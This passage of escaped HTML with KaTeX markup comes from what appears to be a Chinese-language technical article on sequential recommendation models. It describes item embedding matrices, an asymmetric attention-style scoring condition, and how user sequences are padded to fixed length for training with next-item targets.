class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.2917999999999998em;vertical-align:-0.247em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0448em;\"><span style=\"top:-2.454244em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span style=\"top:-3.2198em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">b</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.24575599999999997em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">M</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-2.4530000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n<p>在此矩阵中嵌入矩阵 M 是一个大小为 | I|×d 的矩阵，其中 | I | 是物品总数量，d 是嵌入向量的维度。</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>F</mi><mi>t</mi><mrow><mo stretchy=\"false\">(</mo><mi>b</mi><mo stretchy=\"false\">)</mo></mrow></msubsup></mrow><annotation encoding=\"application/x-tex\">F_{t}^{(b)}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.2905559999999998em;vertical-align:-0.24575599999999992em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0448em;\"><span style=\"top:-2.454244em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span style=\"top:-3.2197999999999998em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">b</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.24575599999999992em;\"><span></span></span></span></span></span></span></span></span></span> 可以表示为取决于项目嵌入 M 的函数，即：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msubsup><mi mathvariant=\"bold\">F</mi><mi>t</mi><mrow><mo stretchy=\"false\">(</mo><mi>b</mi><mo stretchy=\"false\">)</mo></mrow></msubsup><mo>=</mo><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi mathvariant=\"bold\">M</mi><msub><mi>s</mi><mn>1</mn></msub></msub><mo separator=\"true\">,</mo><msub><mi mathvariant=\"bold\">M</mi><msub><mi>s</mi><mn>2</mn></msub></msub><mo separator=\"true\">,</mo><mo>…</mo><mo separator=\"true\">,</mo><msub><mi mathvariant=\"bold\">M</mi><msub><mi>s</mi><mi>t</mi></msub></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">\\mathbf{F}_{t}^{(b)}=f(\\mathbf{M}_{s_{1}},\\mathbf{M}_{s_{2}},\\ldots,\\mathbf{M}_{s_{t}})\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.290556em;vertical-align:-0.24575599999999997em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0448em;\"><span style=\"top:-2.454244em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span style=\"top:-3.2198em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">b</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.24575599999999997em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0001em;vertical-align:-0.2501em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">M</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139199999999997em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">M</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139199999999997em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">M</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139199999999997em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></span></p>\n<p>注意：需要实现不对称 ——<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>F</mi><mi>F</mi><mi>N</mi><mo stretchy=\"false\">(</mo><msub><mi>M</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><msubsup><mi>M</mi><mi>j</mi><mi>T</mi></msubsup><mo mathvariant=\"normal\">≠</mo><mi>F</mi><mi>F</mi><mi>N</mi><mo stretchy=\"false\">(</mo><msub><mi>M</mi><mi>j</mi></msub><mo stretchy=\"false\">)</mo><msubsup><mi>M</mi><mi>i</mi><mi>T</mi></msubsup></mrow><annotation encoding=\"application/x-tex\">FFN(M_i)M_j^T≠FFN(M_j)M_i^T</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.236103em;vertical-align:-0.394772em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-2.441336em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.394772em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\"><span class=\"mord vbox\"><span class=\"thinbox\"><span class=\"rlap\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"inner\"><span class=\"mrel\"></span></span><span class=\"fix\"></span></span></span></span></span><span class=\"mrel\">=</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1274389999999999em;vertical-align:-0.286108em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-2.441336em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.258664em;\"><span></span></span></span></span></span></span></span></span></span></p>\n<p><strong>考虑用户之前的操作，并从访问过的项目的嵌入中得出隐式用户嵌入</strong></p>\n<h3 id=\"网络层训练\"><a class=\"anchor\" href=\"#网络层训练\">#</a> 网络层训练</h3>\n<p>我们将每个用户序列<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><msubsup><mi mathvariant=\"script\">S</mi><mn>1</mn><mi>u</mi></msubsup><mo separator=\"true\">,</mo><msubsup><mi mathvariant=\"script\">S</mi><mn>2</mn><mi>u</mi></msubsup><mo separator=\"true\">,</mo><mo>…</mo><mo separator=\"true\">,</mo><msubsup><mi mathvariant=\"script\">S</mi><mrow><mi mathvariant=\"normal\">∣</mi><msup><mi mathvariant=\"script\">S</mi><mi>u</mi></msup><mi mathvariant=\"normal\">∣</mi><mo>−</mo><mn>1</mn></mrow><mi>u</mi></msubsup><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(\\mathcal{S}_{1}^{u},\\mathcal{S}_{2}^{u},\\ldots,\\mathcal{S}_{|\\mathcal{S}^{u}|-1}^{u})</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.2469999999999999em;vertical-align:-0.49699999999999994em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.075em;\">S</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.664392em;\"><span style=\"top:-2.4518920000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.24810799999999997em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.075em;\">S</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.664392em;\"><span style=\"top:-2.4518920000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.24810799999999997em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.075em;\">S</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6643919999999999em;\"><span style=\"top:-2.378em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∣</span><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.075em;\">S</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.5935428571428571em;\"><span style=\"top:-2.786em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span></span></span></span></span></span><span class=\"mord mtight\">∣</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.49699999999999994em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> 转换为固定长度的序列<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mo>=</mo><mo stretchy=\"false\">{</mo><msub><mi>s</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>s</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mo>…</mo><mo separator=\"true\">,</mo><msub><mi>s</mi><mi>n</mi></msub><mo stretchy=\"false\">}</mo></mrow><annotation encoding=\"application/x-tex\">s=\\{s_1,s_2,\\ldots,s_n\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord\"><span class=\"mord mathnormal\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">}</span></span></span></span>：我们将<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>o</mi><mi>t</mi></msub></mrow><annotation encoding=\"application/x-tex\">o_t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 定义为时间步 t 的预期输出：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi>o</mi><mi>t</mi></msub><mo>=</mo><mrow><mo fence=\"true\">{</mo><mtable rowspacing=\"0.3599999999999999em\" columnalign=\"left left\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mtext>&lt;pad&gt;</mtext></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mtext>如果 </mtext><msub><mi>s</mi><mi>t</mi></msub><mtext>是一个填充项</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>s</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mn>1</mn><mo>≤</mo><mi>t</mi><mo>&lt;</mo><mi>n</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msubsup><mi>S</mi><mrow><mi mathvariant=\"normal\">∣</mi><msup><mi>S</mi><mi>u</mi></msup><mi mathvariant=\"normal\">∣</mi></mrow><mi>u</mi></msubsup></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mi>t</mi><mo>=</mo><mi>n</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding=\"application/x-tex\">o_t=\\begin{cases}\\text{&lt;pad&gt;}&amp;\\text{如果 }s_t\\text{是一个填充项}\\\\s_{t+1}&amp;1\\leq t&lt;n\\\\S_{|S^u|}^u&amp;t=n\\end{cases}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:4.385em;vertical-align:-1.9425em;\"></span><span class=\"minner\"><span class=\"mopen\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.35002em;\"><span style=\"top:-2.19999em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎩</span></span></span><span style=\"top:-2.19499em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-2.20499em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-3.15001em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎨</span></span></span><span style=\"top:-4.2950099999999996em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-4.30501em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-4.60002em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎧</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8500199999999998em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.4425em;\"><span style=\"top:-4.442500000000001em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord text\"><span class=\"mord\">&lt;pad&gt;</span></span></span></span><span style=\"top:-3.0025em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.301108em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span><span class=\"mbin mtight\">+</span><span class=\"mord 